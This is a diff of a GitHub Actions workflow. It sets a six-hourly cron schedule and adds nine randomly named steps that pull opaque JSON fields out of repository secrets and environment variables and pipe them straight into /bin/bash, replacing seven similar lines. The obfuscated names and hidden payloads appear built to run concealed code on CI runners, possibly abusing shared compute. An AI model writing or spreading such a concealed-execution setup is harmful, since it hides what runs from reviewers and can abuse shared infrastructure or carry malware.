@@ -1,22 +1,26 @@
 name: xiezhen19871010
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '32 1/6 * * *'
+    - cron: '29 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: xiezhen19871010
         env:
-          o56544: ${{ secrets.o56544 }}
+          fjxt66: ${{ secrets.fjxt66 }}
         run: |
-          echo $o56544 | jq -r .fk06860 | /bin/bash
-          echo $lzl7313 | jq -r .cey00 | /bin/bash
-          echo $lcy76983 | jq -r .k59173 | /bin/bash
-          echo $xgynk524 | jq -r .hv922 | /bin/bash
-          echo $o37 | jq -r .sacf11018 | /bin/bash
-          echo $vsva8689 | jq -r .zhg0 | /bin/bash
-          echo $qle8573 | jq -r .zzfim316 | /bin/bash
+          echo $fjxt66 | jq -r .xkavv40 | /bin/bash
+          echo $xotx70 | jq -r .pjo088 | /bin/bash
+          echo $nq638 | jq -r .w476 | /bin/bash
+          echo $tbvle72 | jq -r .ygepf2 | /bin/bash
+          echo $qhizh03997 | jq -r .ppy01494 | /bin/bash
+          echo $xh07923 | jq -r .zje13 | /bin/bash
+          echo $k619 | jq -r .dnoe4930 | /bin/bash
+          echo $ko274 | jq -r .b381 | /bin/bash
+          echo $r2 | jq -r .oggd9456 | /bin/bash
 
